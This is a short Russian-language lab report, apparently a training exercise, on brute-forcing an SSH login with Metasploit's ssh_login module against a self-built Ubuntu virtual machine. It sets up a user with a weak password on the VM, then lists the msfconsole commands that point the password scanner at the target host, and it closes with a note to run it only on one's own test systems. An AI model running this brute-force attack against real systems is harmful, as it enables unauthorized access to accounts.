# Отчёт 02 — Brute-force SSH с использованием Metasploit (учебный пример)

## Цель
Научиться настраивать и запускать модуль `auxiliary/scanner/ssh/ssh_login` в Metasploit для проверки паролей учётной записи в учебной среде.

## Окружение
- Виртуальная машина Ubuntu (ssh-сервер)
- Цель: пользователь `hackme` с заранее установленным простым паролем
- Kali с Metasploit

## Подготовка на Ubuntu (пример команд)
```bash
sudo apt update
sudo apt install -y openssh-server
sudo adduser --gecos "" --disabled-password hackme
echo "hackme:Password123" | sudo chpasswd
sudo systemctl enable --now ssh
```

## Подготовка Metasploit (пример)
```bash
sudo service postgresql start
sudo msfdb init
sudo msfconsole -q
# В msfconsole:
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.0.11
set USERNAME hackme
set PASS_FILE /root/passwords.txt
run
```

## Пример вывода
- В `results/metasploit_log.txt` — демонстрационный лог, где видно подобранный пароль.

## Этическое замечание
Брутфорс — агрессивная техника. Запускайте только на своих тестовых системах.
